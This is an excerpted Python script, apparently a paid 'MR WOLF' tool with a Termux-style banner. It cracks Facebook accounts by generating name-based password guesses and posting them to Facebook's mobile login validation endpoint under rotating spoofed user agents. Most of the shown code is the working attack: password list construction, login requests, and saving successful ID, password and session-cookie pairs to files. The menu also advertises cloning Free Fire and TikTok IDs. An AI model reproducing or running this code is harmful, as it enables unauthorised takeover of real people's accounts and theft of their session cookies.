...
os.system("espeak -a 300 \"YOUR UPDATE VERSION 2.0V,\"")
time.sleep(2)
#os.system('clear')
...
ua = [
    ...
    "Mozilla/5.0 (Linux; Android 13; SM-G991B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.32.112]",
    "Mozilla/5.0 (Linux; Android 12; M2007J20CG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111]",
    "Mozilla/5.0 (Linux; Android 11; V2043 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/431.0.0.30.108]",
    "Mozilla/5.0 (Linux; Android 10; HRY-LX1 Build/HUAWEIHY-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102]",
    "Mozilla/5.0 (Linux; Android 12; SM-A705FN Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.32.112]",
    "Mozilla/5.0 (Linux; Android 13; SM-G986B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.33.113]",
    "Mozilla/5.0 (Linux; Android 12; TECNO KE5k Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111]",
    "Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/431.0.0.30.108]",
    "Mozilla/5.0 (Linux; Android 10; SM-N981B Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102]",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/118.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/435.0.0.33.113]",
]
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR WOLF ]\33[1;38m    ║\033[1;31m 
╠══[Facebook                 • Ifad Ibrahim       ║  \033[1;97m  
╠══[Github                   • \33[1;38mmMr Wolf ║\33[1;34m   
╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
...
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m WELCOME TO MR WOLF TOOLS \033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●             \033[1;91m[\033[1;92m√\033[1;91m]
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱""")
...
xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN TO ENTER""")
  ...
  try:
    ...
    if id in httpCaht:
     ...
     # print(" \033[32;1m[+] Your Key : "+id)
      print(' \x1b[38;5;208m╔══[𝟷] FREE USER NOT COME TO INBOX')
      print(' \x1b[1;97m║══[𝟸] FREE FIRE & TIKTOK ID CLONING')
      ...
      input(' \x1b[38;5;50m╚══[𝟹] IF YOU WANT TO BUY IT THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://www.facebook.com/ifad.ibrahim.8'+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
...
os.system('espeak -a 300 " Welcome,   to,  MR WOLF,  V I P,  Tools"')
def back():
	login()
...
while attemps < 12345677901:
    ...
    if username == 'mr' and password == 'wolf':
...
def menu():
    ...
    print("""\x1b[1;91m║══\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m \033[0;93mFOLLOW MY FACEBOOK ACCOUNT""")
    ...
    print('\x1b[38;5;50║══=================')
    WOLF = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
    if WOLF in ['111']:
        login()
        dump_massal()
    elif WOLF in ['1']:
...
pwv.append(frs+'pass')
pwv.append(frs+'word')
pwv.append(frs+'@password')
pwv.append(frs+'pass123')
pwv.append(frs+'pass456')
pwv.append(frs+'@pass123')
pwv.append(frs+'admin')
pwv.append(frs+'@admin')
pwv.append(frs+'admin123')
pwv.append(frs+'user')
pwv.append(frs+'@user')
pwv.append(frs+'user123')
pwv.append(frs+'guest')
pwv.append(frs+'@guest')
pwv.append(frs+'guest123')
pwv.append(frs+'test')
pwv.append(frs+'@test')
pwv.append(frs+'test123')
...
pwv.append(frs+'9999')
pwv.append(frs+'0000')
pwv.append(frs+'pass@123')
pwv.append(frs+'admin@123')
pwv.append(frs+'qwerty')
pwv.append(frs+'@qwerty')
pwv.append(frs+'asdf')
pwv.append(frs+'@asdf')
pwv.append(frs+'zxcv')
...
pwv.append(frs+'love')
pwv.append(frs+'@love')
pwv.append(frs+'love123')
pwv.append(frs+'hello')
pwv.append(frs+'@hello')
pwv.append(frs+'world')
pwv.append(frs+'@world')
pwv.append(frs+'letmein')
pwv.append(frs+'@letmein')
pwv.append(frs+'welcome')
pwv.append(frs+'@welcome')
pwv.append(frs+'secure')
pwv.append(frs+'@secure')
pwv.append(frs+'password1')
pwv.append(frs+'@password1')
                    pwv.append(nmf)
                    pwv.append('57273200')
                    pwv.append(frs+'@123')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[WOLF-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mWOLF-CP\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> {idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \033[1;92m{pw}')
                print('\x1b[38;5;50m===============================================')
                ...
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mWOLF-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[💙]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                print('\x1b[38;5;50m===============================================')
                os.system('espeak -a 300 " WOLF,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[WOLF-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mWOLF-CP\033[1;91m] {idf} • {pw}')
                print('\x1b[38;5;50m============================')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•WOLF-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
                print('\x1b[38;5;50m===============================================')
                os.system('espeak -a 300 " WOLF,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
